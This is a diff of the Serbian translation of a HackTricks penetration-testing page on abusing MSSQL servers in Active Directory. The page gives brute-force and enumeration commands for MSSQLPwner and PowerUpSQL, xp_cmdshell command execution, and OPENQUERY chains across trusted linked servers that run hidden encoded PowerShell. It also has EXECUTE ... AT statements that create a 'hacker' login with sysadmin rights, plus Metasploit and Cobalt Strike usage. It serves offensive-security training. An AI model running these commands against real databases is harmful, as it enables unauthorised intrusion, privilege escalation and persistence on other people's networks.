@@ -1,13 +1,13 @@
-# MSSQL AD Abuse
+# Zloupotreba MSSQL AD-a
 
 {{#include ../../banners/hacktricks-training.md}}
 
 
-## **MSSQL Enumeracija / Otkriće**
+## **MSSQL enumeracija / otkrivanje**
 
 ### Python
 
-Alat [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) se zasniva na impacket-u, i takođe omogućava autentifikaciju koristeći kerberos karte, i napad kroz lanac veza.
+Alat [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) zasnovan je na impacket-u i takođe omogućava autentifikaciju pomoću Kerberos ticket-a i napad kroz lance linkova
 
 <figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
 ```shell
@@ -79,7 +79,7 @@ mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt
 mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
 
 ```
-### Enumeracija sa mreže bez domen sesije
+### Enumerisanje sa mreže bez sesije na domenu
 ```
 
 # Interactive mode
@@ -94,7 +94,7 @@ Powershell modul [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) je veoma kor
 ```bash
 Import-Module .\PowerupSQL.psd1
 ````
-### Enumeracija sa mreže bez domen sesije
+### Enumerisanje sa mreže bez sesije domena
 ```bash
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -133,9 +133,9 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 # Get DBs, test connections and get info in oneliner
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
-## MSSQL Osnovna Zloupotreba
+## Osnovna zloupotreba MSSQL-a
 
-### Pristup DB
+### Pristup DB-u
 ```bash
 # List databases
 Get-SQLInstanceDomain | Get-SQLDatabase
@@ -166,22 +166,22 @@ Možda je takođe moguće **izvršiti komande** unutar MSSQL hosta
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-Proverite na stranici pomenutoj u **sledećem odeljku kako to uraditi ručno.**
+Proverite na stranici navedenoj u **sledećem odeljku kako da ovo uradite ručno.**
 
-### MSSQL Osnovne Hacking Tehnike
+### MSSQL Basic Hacking Tricks
 
 
 {{#ref}}
 ../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/
 {{#endref}}
 
-## MSSQL Pouzdane Povezane Baze
+## MSSQL Trusted Links
 
-Ako je MSSQL instanca pouzdana (povezana baza) od strane druge MSSQL instance. Ako korisnik ima privilegije nad pouzdanom bazom, moći će da **iskoristi odnos poverenja da izvrši upite i u drugoj instanci**. Ove veze se mogu povezivati i u nekom trenutku korisnik može pronaći neku pogrešno konfigurisanu bazu gde može izvršavati komande.
+Ako MSSQL instanci veruje druga MSSQL instanca (database link), a korisnik ima privilegije nad pouzdanom bazom podataka, moći će da **iskoristi odnos poverenja za izvršavanje upita i na drugoj instanci**. Ovi odnosi poverenja mogu da se ulančavaju i korisnik bi u nekom trenutku mogao da pronađe pogrešno konfigurisanu bazu podataka u kojoj može da izvršava komande.
 
-**Povezane baze funkcionišu čak i preko šuma poverenja.**
+**Veze između baza podataka funkcionišu čak i između forest trusts.**
 
-### Zloupotreba Powershell-a
+### Powershell Abuse
 ```bash
 #Look for MSSQL links of an accessible instance
 Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
@@ -213,7 +213,7 @@ Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_c
 ## If you see the results of @@selectname, it worked
 Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
 ```
-Još jedan sličan alat koji se može koristiti je [**https://github.com/lefayjey/SharpSQLPwn**](https://github.com/lefayjey/SharpSQLPwn):
+Još jedan sličan alat koji bi mogao da se koristi je [**https://github.com/lefayjey/SharpSQLPwn**](https://github.com/lefayjey/SharpSQLPwn):
 ```bash
 SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
 # Cobalt Strike
@@ -221,43 +221,43 @@ inject-assembly 4704 ../SharpCollection/SharpSQLPwn.exe /modules:LIC /linkedsql:
 ```
 ### Metasploit
 
-Možete lako proveriti pouzdane linkove koristeći metasploit.
+Pomoću Metasploit-a možete lako proveriti pouzdane veze.
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-Obratite pažnju da će metasploit pokušati da zloupotrebi samo `openquery()` funkciju u MSSQL (dakle, ako ne možete da izvršite komandu sa `openquery()`, moraćete da pokušate `EXECUTE` metodu **ručno** da izvršite komande, više informacija u nastavku.)
+Imajte na umu da će metasploit pokušati da zloupotrebi samo funkciju `openquery()` u MSSQL-u (zato, ako ne možete da izvršite komandu pomoću `openquery()`, moraćete ručno da isprobate metod `EXECUTE` kako biste izvršili komande; pogledajte više u nastavku.)
 
-### Ručno - Openquery()
+### Manual - Openquery()
 
-Sa **Linux-a** možete dobiti MSSQL konzolnu ljusku sa **sqsh** i **mssqlclient.py.**
+Iz **Linux**-a možete dobiti MSSQL konzolni shell pomoću alata **sqsh** i **mssqlclient.py.**
 
-Sa **Windows-a** takođe možete pronaći linkove i izvršiti komande ručno koristeći **MSSQL klijent kao** [**HeidiSQL**](https://www.heidisql.com)
+Iz **Windows**-a takođe možete pronaći linkove i ručno izvršavati komande pomoću **MSSQL klijenta kao što je** [**HeidiSQL**](https://www.heidisql.com)
 
-_Prijavite se koristeći Windows autentifikaciju:_
+_Pr prijavljivanju pomoću Windows autentifikacije:_
 
-![](<../../images/image (808).png>)
+![Metasploit - Manual - Openquery(): Prijavljivanje pomoću Windows autentifikacije](<../../images/image (808).png>)
 
-#### Pronađite pouzdane linkove
+#### Pronalaženje pouzdanih linkova
 ```sql
 select * from master..sysservers;
 EXEC sp_linkedservers;
 ```
-![](<../../images/image (716).png>)
+![Priručnik - Openquery() - Pronalaženje pouzdanih linkova: EXEC sp linkedservers;](<../../images/image (716).png>)
 
-#### Izvršavanje upita u pouzdanoj vezi
+#### Izvršavanje upita preko pouzdanog linka
 
-Izvršite upite putem veze (primer: pronađite više veza u novoj dostupnoj instanci):
+Izvršavajte upite preko linka (primer: pronađite još linkova u novoj dostupnoj instanci):
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 > [!WARNING]
-> Proverite gde se koriste dvostruki i jednostruki navodnici, važno je koristiti ih na taj način.
+> Proverite gde se koriste dvostruki i jednostruki navodnici, važno je da se koriste na taj način.
 
-![](<../../images/image (643).png>)
+![Pronalaženje pouzdanih linkova - Izvršite upite na pouzdanom linku: Proverite gde se koriste dvostruki i jednostruki navodnici, važno je da se koriste na taj način](<../../images/image (643).png>)
 
-Možete ručno nastaviti ovu vezu pouzdanih linkova zauvek.
+Ovaj lanac pouzdanih linkova možete ručno nastaviti zauvek.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -265,26 +265,28 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
-Ako ne možete izvršiti akcije poput `exec xp_cmdshell` iz `openquery()`, pokušajte sa metodom `EXECUTE`.
+Ako ne možete da izvršite radnje poput `exec xp_cmdshell` iz `openquery()`, pokušajte pomoću metode `EXECUTE`.
 
 ### Ručno - EXECUTE
 
-Takođe možete zloupotrebiti poverljive linkove koristeći `EXECUTE`:
+Takođe možete da zloupotrebite trusted links koristeći `EXECUTE`:
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
-## Lokalna Eskalacija Privilegija
+## Lokalna eskalacija privilegija
 
-**MSSQL lokalni korisnik** obično ima posebnu vrstu privilegije nazvanu **`SeImpersonatePrivilege`**. Ovo omogućava nalogu da "imituje klijenta nakon autentifikacije".
+**MSSQL lokalni korisnik** obično ima posebnu vrstu privilegije pod nazivom **`SeImpersonatePrivilege`**. Ovo nalogu omogućava da „impersonira klijenta nakon autentifikacije“.
 
-Strategija koju su mnogi autori osmislili je da primoraju SYSTEM servis da se autentifikuje na lažni ili man-in-the-middle servis koji napadač kreira. Ovaj lažni servis tada može imitirati SYSTEM servis dok pokušava da se autentifikuje.
+Strategija koju su osmislili mnogi autori jeste da primoraju SYSTEM servis da se autentifikuje na lažnom servisu ili servisu posrednika (man-in-the-middle) koji napadač kreira. Taj lažni servis tada može da impersonira SYSTEM servis dok ovaj pokušava da se autentifikuje.
 
-[SweetPotato](https://github.com/CCob/SweetPotato) ima kolekciju ovih raznih tehnika koje se mogu izvršiti putem Beacon-ove `execute-assembly` komande.
+[SweetPotato](https://github.com/CCob/SweetPotato) sadrži kolekciju različitih tehnika koje se mogu izvršiti pomoću Beacon komande `execute-assembly`.
 
-### SCCM Tačka Upravljanja NTLM Preusmeravanje (Ekstrakcija OSD Tajni)
-Pogledajte kako se podrazumevane SQL uloge SCCM **Tačaka Upravljanja** mogu zloupotrebiti za dumpovanje tajni Mrežnog Pristupnog Naloga i Task-Sequence direktno iz baze podataka sajta:
+
+
+### SCCM Management Point NTLM Relay (OSD Secret Extraction)
+Pogledajte kako se podrazumevane SQL uloge SCCM **Management Points** mogu zloupotrebiti za direktno preuzimanje tajni Network Access Account naloga i Task-Sequence sekvenci iz site baze podataka:
 
 {{#ref}}
 sccm-management-point-relay-sql-policy-secrets.md
